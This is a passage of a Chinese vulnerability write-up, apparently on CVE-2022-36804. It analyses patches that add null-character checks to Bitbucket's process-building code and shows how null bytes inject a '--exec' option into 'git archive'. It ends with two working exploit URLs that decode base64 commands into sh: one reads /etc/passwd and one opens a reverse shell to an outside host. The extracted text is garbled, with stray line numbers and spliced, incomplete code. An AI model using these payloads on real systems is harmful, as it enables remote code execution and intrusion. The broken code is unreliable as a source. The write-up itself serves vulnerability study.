○
补丁分析
addIf(NioProcessParameters$Builder::nonNullAndNoNullChar, this.arguments, v
alue);
1
Java
复制代码
    private static boolean nonNullAndNoNullChar(String value) {
        if (value == null) {
            return false;
        } else {
            requireNoNullChars(value);
            return true;
        }
    }
    private static void requireNoNullChars(String value) {
        if (value.indexOf(0) >= 0) {
            throw new IllegalArgumentException("Unsupported \\0 character 
detected: " + value);
        }
    }
    private static String requireNonBlankAndNoNullChar(String value, Strin
g msg) {
        requireNonBlank(value, msg);
        requireNoNullChars(value);
        return value;
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
Java
复制代码
11
（2） nuprocess-2.0.2-atlassian-3.jar 的补丁 
增加了 ensureNoNullCharacters 校验， 
12
函数的作⽤，依然是在校验不能有NULL字符。 
public class NuProcessBuilder {
    private static final NuProcessFactory factory;
    private final List command;
    private final TreeMap environment;
    private Path cwd;
    private NuProcessHandler processListener;
    public NuProcessBuilder(List commands, Map env
ironment) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands); //patch
            this.environment = new TreeMap(environment);
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not b
e null or empty");
        }
    }
    public NuProcessBuilder(List commands) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands); //patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not b
e null or empty");
        }
    }
    public NuProcessBuilder(String... commands) {
        if (commands != null && commands.length != 0) {
            List commandsList = Arrays.asList(commands); 
//patc
h
            this.ensureNoNullCharacters(commandsList); //patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commandsList);
        } else {
            throw new IllegalArgumentException("List of commands may not b
e null or empty");
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
Java
复制代码
13
所以，为啥要对NULL字符进⾏重重校验？ 
初步猜测，攻击者通过某种⽅式调⽤了命令执⾏函数，⼿法可能有：
任意对象实例化（类似Spring-Core反序列，更改了某些重要变量；但历史上只有7995端⼝出过反
序列，HTTP端⼝没有） 
某些冷⻔Feature，例如scm那⼀堆旧的功能，我未跟进，不过看历史⽂章，可能会有搞头。 
再通过NULL字节绕过了某些限制？？天⻢⾏空起来。。 
暂时
没有找到命令执⾏处的调⽤点
●
●
●
private void ensureNoNullCharacters(List commands) {
    Iterator var2 = commands.iterator();
    String command;
    do {
        if (!var2.hasNext()) {
            return;
        }
        command = (String)var2.next();
    } while(command.indexOf(0)  command = new ArrayList(Arrays.asList(stringArray));
        String[] cmdarray = (String[])command.toArray(new String[0]);
        byte[][] args = new byte[cmdarray.length - 1][];
        System.out.println( args );
        int size = args.length;
    // 取 git 命令数组参数，第0位之后，存储到 args[][]
        for(int i = 0; i "} ，若  可控，也不能注⼊其它的命令。因为
此时执⾏命令的主体是git，⽽不是其它可执⾏⽂件。第⼆个参数的所有内容，都只会被视为是git命令
的选项。
（3）为什么是git archive? 
# 输⼊
{"git", "archive", "Hello\u0000World!", "-- "};  
# 输出
[a, r, c, h, i, v, e, , H, e, l, l, o,  , W, o, r, l, d, !, 
, -, -,  , ]
==  {'archive', 'Hello', 'World!', '--' }
1
2
3
4
5
6
7
Java
复制代码
18
archive有  --exec 选项，可以被滥⽤来执⾏命令。 
注意：执⾏的命令并⾮完全回显，会被截断；视作⽆回显的RCE就⾏了 
例如，执⾏ cat /etc/passwd ，只显示了  root  
EXP 
https://github.com/notxesh/CVE-2022-36804-PoC/blob/main/CVE-2022-36804.py
# rce
http://10.10.111.35:7990/rest/api/latest/projects/PUB/repos/repo/archive?fo
rmat=zip&&path=&prefix=test/%00--remote=''%00--exec=echo+'Y2F0IC9ldGMvcGFzc
3dkCg=='+%7c+base64+-d++%7c+sh;%00
# 反弹shell
http://10.10.111.35:7990/rest/api/latest/projects/PUB/repos/repo/archive?fo
rmat=zip&=&path=&prefix=test/%00--remote=''%00--exec=echo+'YmFzaCAtaSA%2bJi
AvZGV2L3RjcC8xMC4xMC4xMTEuMS80NDQ0IDA%2bJjEK'+%7c+base64+-d++%7c+sh;%00
1
2
3
4
5
6
Basic
复制代码
19
Install Note:https://confluence.atlassian.com/bitbucketserver/supported-platforms-
776640981.html 
https://www.geek-share.com/detail/2803770907.html 
https://www.anquanke.com/post/id/280193 
Ref 
●
●
●
● 📎2019第五届互联⽹安全领袖峰会_对基于Git的版本控制服务的通⽤攻击⾯的探索.pdf